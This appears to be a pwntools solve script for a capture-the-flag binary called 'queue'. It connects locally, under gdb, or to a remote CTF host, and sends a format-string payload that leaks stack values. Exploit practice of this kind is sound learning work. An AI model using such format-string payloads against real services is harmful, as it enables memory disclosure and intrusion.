#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./queue"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.actf.co", 31322)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+274
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"%12$x%13$x%14$x%15$x%16$x%17$x%18$x"

p.recvuntil("?")
p.sendline(payload)

p.interactive()
